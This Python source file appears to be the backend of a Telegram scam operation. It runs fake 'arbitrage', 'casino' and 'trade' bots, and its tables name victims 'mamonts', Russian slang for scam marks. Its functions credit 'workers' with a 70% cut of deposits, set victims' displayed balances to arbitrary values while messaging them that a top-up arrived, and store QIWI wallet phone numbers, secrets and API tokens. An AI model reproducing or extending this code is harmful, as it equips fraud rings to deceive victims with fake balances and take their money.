from aiogram import Bot
import sqlite3
import config

bot = Bot(config.API_Worker, parse_mode='HTML')
arbitrbot = Bot(config.API_Arbitrage, parse_mode='HTML') 
casinobot = Bot(config.API_Casino, parse_mode='HTML') 
tradebot = Bot(config.API_Trade, parse_mode='HTML') 
bd = 'data/database.db'

async def penciil(gaga):
    dada = gaga.split(':')
    if len(dada) == 4:
        name = dada[0]
        idd = dada[1]
        userrrname = dada[2]
        price = dada[3]
        comission = int(0.70 * int(price))
        with sqlite3.connect(bd) as c:
            c.execute('UPDATE workers SET profit = profit + ? WHERE id = ?',(price,idd))
        await bot.send_message(config.LOG_CHANNEL, f'💎 <b>Успешное</b> пополнение ({name})\n\n🤵🏻 Воркер: <b>{userrrname}</b>\n\n🏢 Сумма пополнения: <b>{price}₽</b>\n\n💵 Доля воркера: ~ <b>{comission} ₽</b>')
        return True
    else:
        return False

async def GiveBalance(idinah,danah,gaga):
    if danah == 'arbitrage':
        if gaga.isdigit():
            with sqlite3.connect(bd) as c:
                c.execute('UPDATE mamonts_arbitr SET balance = ? WHERE id = ?',(gaga,idinah))
            await arbitrbot.send_message(idinah, f'💰 <b>Ваш баланс пополнен на</b> {gaga} 💰')
            return True
        else:
            return False
    elif danah == 'casino':
        if gaga.isdigit():
            with sqlite3.connect(bd) as c:
                c.execute('UPDATE mamonts_casino SET balance = ? WHERE id = ?',(gaga,idinah))
            await casinobot.send_message(idinah, f'💰 <b>Ваш баланс пополнен на</b> {gaga} 💰')
            return True
        else:
            return False
    else:
        if gaga.isdigit():
            with sqlite3.connect(bd) as c:
                c.execute('UPDATE mamonts_trade SET balance = ? WHERE id = ?',(gaga,idinah))
            await tradebot.send_message(idinah, f'💰 <b>Ваш баланс пополнен на</b> {gaga} 💰')
            return True
        else:
            return False

async def upravkivi(gaga):
    dada = gaga.split(':')
    if len(dada) == 3:
        phone = dada[0]
        secret = dada[1]
        api_token = dada[2]
        with sqlite3.connect(bd) as c:
            c.execute('INSERT INTO qiwis VALUES(?,?,?)',(phone,secret,api_token))
        return True
    else:
        return False